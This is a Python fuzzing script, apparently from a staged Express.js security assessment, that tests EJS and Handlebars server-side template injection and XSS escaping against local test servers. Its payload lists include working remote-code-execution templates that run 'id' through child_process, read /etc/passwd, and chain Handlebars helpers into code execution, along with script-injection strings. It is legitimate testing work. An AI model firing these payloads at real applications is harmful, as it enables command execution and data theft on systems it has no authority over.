#!/usr/bin/env python3
"""
Phase 2.4 — SSTI Fuzzer
Express.js Security Assessment — [REDACTED]

Tests EJS and Handlebars template engine behavior when integrated with Express.
SCOPE: Framework template integration behavior (how Express passes data to engines).
"""

import requests
import json
import os
import urllib.parse
from datetime import datetime

TARGETS = {'v5': 'http://127.0.0.1:3000', 'v4': 'http://127.0.0.1:3001'}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {'phase': '2.4', 'name': 'SSTI Fuzzer', 'timestamp': datetime.now().isoformat(),
                 'scope': 'Express template engine integration'},
    'tests': [], 'findings': [], 'anomalies': [], 'summary': {}
}
test_count = 0
anomaly_count = 0

def log_test(name, ver, data, finding=None, anomaly=None):
    global test_count, anomaly_count
    test_count += 1
    results['tests'].append({'id': test_count, 'test': name, 'version': ver, 'data': data})
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': ver})
        print(f"  [{test_count:3d}] ⚠ {name} ({ver})")
    elif anomaly:
        anomaly_count += 1
        results['anomalies'].append({'id': anomaly_count, **anomaly, 'version': ver})
        print(f"  [{test_count:3d}] ? {name} ({ver})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({ver})")


def fuzz_ejs():
    """Test EJS template injection — focuses on how Express.render() integrates with EJS"""
    print("\n[*] Fuzzing EJS template injection...")

    ejs_payloads = [
        ('math', '<%= 7*7 %>', '49'),
        ('string_concat', '<%= "hello" + "world" %>', 'helloworld'),
        ('process_env', '<%= process.env.PATH %>', '/'),
        ('process_version', '<%= process.version %>', 'v'),
        ('global_process', '<%= global.process.version %>', 'v'),
        ('require_os', '<%= process.mainModule.require("os").hostname() %>', None),
        ('require_child_process', '<%= process.mainModule.require("child_process").execSync("id").toString() %>', 'uid='),
        ('require_fs_read', '<%= process.mainModule.require("fs").readFileSync("/etc/passwd").toString() %>', 'root:'),
        ('include_etc_passwd', '<%- include("/etc/passwd") %>', 'root:'),
        ('constructor_rce', '<%= this.constructor.constructor("return process.mainModule.require(\'child_process\').execSync(\'id\').toString()")() %>', 'uid='),
        ('escaped_tag', '&lt;%= 7*7 %&gt;', None),
        ('nested_tags', '<%= "<%= 7*7 %>" %>', None),
        ('comment_injection', '<%# comment %><%= 7*7 %>', '49'),
        ('raw_output', '<%- "<script>alert(1)</script>" %>', '<script>'),
        ('multiline', '<% var x = 7; %><%= x * x %>', '49'),
    ]

    for ver, base in TARGETS.items():
        for name, tpl, indicator in ejs_payloads:
            # Test via user-controlled template (app-level vuln, but tests EJS engine behavior)
            try:
                r = requests.get(f'{base}/render-ejs', params={'tpl': tpl, 'name': 'test'}, timeout=5)
                body = r.text

                finding = None
                if indicator and indicator in body:
                    severity = 'CRITICAL' if any(x in name for x in ['child_process', 'fs_read', 'include_etc', 'constructor_rce']) else 'HIGH'
                    finding = {
                        'title': f'EJS Template Injection: {name}',
                        'severity': severity,
                        'cwe': 'CWE-1336',
                        'description': f'EJS renders user-controlled template with full Node.js context. '
                                       f'Indicator "{indicator}" found in response.',
                        'framework_behavior': True,
                        'note': 'EJS does not sandbox template execution — Express res.render() trusts template input'
                    }

                log_test(f'ejs_{name}', ver, {
                    'template': tpl[:200], 'status': r.status_code,
                    'body': body[:500], 'indicator_found': indicator in body if indicator else False
                }, finding)
            except Exception as e:
                log_test(f'ejs_{name}', ver, {'error': str(e)})

        # Test safe endpoint (fixed template) — should not be injectable
        for name, value, indicator in [
            ('xss_in_name', '<script>alert(1)</script>', '&lt;script'),
            ('ejs_in_name', '<%= 7*7 %>', '49'),
            ('template_literal', '${7*7}', '49'),
        ]:
            try:
                r = requests.get(f'{base}/render-ejs-safe', params={'name': value}, timeout=5)
                body = r.text
                finding = None

                if indicator and indicator in body and name == 'ejs_in_name':
                    finding = {
                        'title': 'EJS Interprets Tags in Data Variable',
                        'severity': 'HIGH', 'cwe': 'CWE-1336',
                        'description': 'EJS tags in variable data are executed even with fixed template',
                        'framework_behavior': True
                    }

                log_test(f'ejs_safe_{name}', ver, {
                    'value': value, 'status': r.status_code,
                    'body': body[:300], 'indicator_found': indicator in body if indicator else False
                }, finding)
            except Exception as e:
                log_test(f'ejs_safe_{name}', ver, {'error': str(e)})


def fuzz_handlebars():
    """Test Handlebars template behavior"""
    print("\n[*] Fuzzing Handlebars template injection...")

    hbs_payloads = [
        ('basic', '{{name}}', None),
        ('math', '{{7*7}}', None),
        ('triple_stache', '{{{name}}}', None),  # Unescaped
        ('helper_lookup', '{{lookup this "constructor"}}', None),
        ('with_block', '{{#with "s" as |string|}}{{string}}{{/with}}', None),
        ('each_block', '{{#each this}}{{@key}}:{{this}} {{/each}}', None),
        ('prototype_access', '{{this.__proto__}}', None),
        ('constructor_access', '{{this.constructor}}', None),
        ('rce_attempt', '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}', 'uid='),
        ('partial_injection', '{{> (lookup . "constructor") }}', None),
    ]

    for ver, base in TARGETS.items():
        for name, tpl, indicator in hbs_payloads:
            try:
                r = requests.get(f'{base}/render-hbs', params={'tpl': tpl, 'name': '<b>test</b>'}, timeout=5)
                body = r.text

                finding = None
                if indicator and indicator in body:
                    finding = {
                        'title': f'Handlebars Template Injection: {name}',
                        'severity': 'CRITICAL', 'cwe': 'CWE-1336',
                        'description': f'Handlebars RCE via template injection. Indicator "{indicator}" found.',
                        'framework_behavior': True
                    }

                log_test(f'hbs_{name}', ver, {
                    'template': tpl[:200], 'status': r.status_code,
                    'body': body[:500]
                }, finding)
            except Exception as e:
                log_test(f'hbs_{name}', ver, {'error': str(e)})


def fuzz_xss_via_templates():
    """Test XSS through Express template rendering — framework escaping behavior"""
    print("\n[*] Testing XSS via template rendering (Express escaping behavior)...")

    xss_payloads = [
        ('basic_script', '<script>alert(1)</script>'),
        ('img_onerror', '<img src=x onerror=alert(1)>'),
        ('svg_onload', '<svg onload=alert(1)>'),
        ('event_handler', '" onmouseover="alert(1)"'),
        ('style_injection', '<style>body{background:red}</style>'),
        ('unicode_escape', '\u003cscript\u003ealert(1)\u003c/script\u003e'),
        ('html_entities', '&lt;script&gt;alert(1)&lt;/script&gt;'),
        ('double_encode', '%3Cscript%3Ealert(1)%3C/script%3E'),
        ('null_byte', '<scr\x00ipt>alert(1)</script>'),
        ('mixed_case', '<ScRiPt>alert(1)</sCrIpT>'),
    ]

    for ver, base in TARGETS.items():
        for name, payload in xss_payloads:
            # Escaped output (greet — uses <%= %>)
            try:
                r = requests.get(f'{base}/greet', params={'name': payload}, timeout=5)
                escaped = payload not in r.text or '&lt;' in r.text
                log_test(f'xss_escaped_{name}', ver, {
                    'payload': payload[:100], 'escaped': escaped,
                    'status': r.status_code, 'body': r.text[:300]
                })
            except Exception as e:
                log_test(f'xss_escaped_{name}', ver, {'error': str(e)})

            # Unescaped output (greet-raw — uses <%- %>)
            try:
                r = requests.get(f'{base}/greet-raw', params={'name': payload}, timeout=5)
                reflected = payload in r.text
                finding = None
                if reflected and '<script>' in payload.lower():
                    finding = {
                        'title': f'XSS via Unescaped EJS Output ({name})',
                        'severity': 'MEDIUM',
                        'cwe': 'CWE-79',
                        'description': 'EJS <%- %> tag renders unescaped HTML. Framework provides both '
                                       'escaped (<%= %>) and unescaped (<%- %>) options. This is by design.',
                        'framework_behavior': True,
                        'note': 'EJS provides unescaped output by design — framework does not warn'
                    }
                log_test(f'xss_raw_{name}', ver, {
                    'payload': payload[:100], 'reflected': reflected,
                    'status': r.status_code, 'body': r.text[:300]
                }, finding)
            except Exception as e:
                log_test(f'xss_raw_{name}', ver, {'error': str(e)})


def main():
    print("=" * 70)
    print("Phase 2.4 — SSTI Fuzzer")
    print("Express.js Security Assessment — Template Engine Integration")
    print("=" * 70)

    fuzz_ejs()
    fuzz_handlebars()
    fuzz_xss_via_templates()

    results['summary'] = {
        'total_tests': test_count, 'findings_count': len(results['findings']),
        'anomalies_count': anomaly_count
    }
    out_file = os.path.join(EVIDENCE_DIR, 'ssti_fuzzer_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nSSTI fuzzer complete: {test_count} tests, {len(results['findings'])} findings, {anomaly_count} anomalies")
    print(f"Evidence: {out_file}")

if __name__ == '__main__':
    main()
